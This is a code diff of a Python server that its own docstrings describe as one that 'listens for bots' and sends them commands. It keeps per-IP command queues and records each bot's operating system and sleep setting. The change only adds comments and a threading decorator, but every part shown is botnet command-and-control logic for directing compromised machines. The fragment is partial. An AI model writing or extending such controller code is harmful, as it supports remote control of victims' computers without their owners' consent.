@@ -6,9 +6,11 @@ from select import select
 from functools import wraps
 from datetime import datetime
 
+# the client command queues {"host IP": [ "command", "list" ]}
 queue = {}
 
 def thread(func):
+    """Used to thread a function with a decorator"""
     @wraps(func)
     def async_func(*args, **kwargs):
         func_hl = Thread(target = func, args = args, kwargs = kwargs)
@@ -16,7 +18,9 @@ def thread(func):
         return func_hl
     return async_func
 
+@thread
 def main(port=8080):
+    """Binds to a port and listens for bots"""
     s = socket.socket()
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(("0.0.0.0", port))
@@ -29,6 +33,7 @@ def main(port=8080):
 
 @thread
 def handle_client(sock, addr):
+    """Send commands, receive responses and update database for a single bot"""
     try:
         b = Bot.query.filter_by(ip=addr[0]).one()
     except:
@@ -56,6 +61,7 @@ def handle_client(sock, addr):
     sock.close()
 
 def action(data, bot):
+    """Handles received data from a bot"""
     if data.startswith("set os:"):
         bot.os = data.split(":")[1]
     elif data.startswith("set sleep:"):
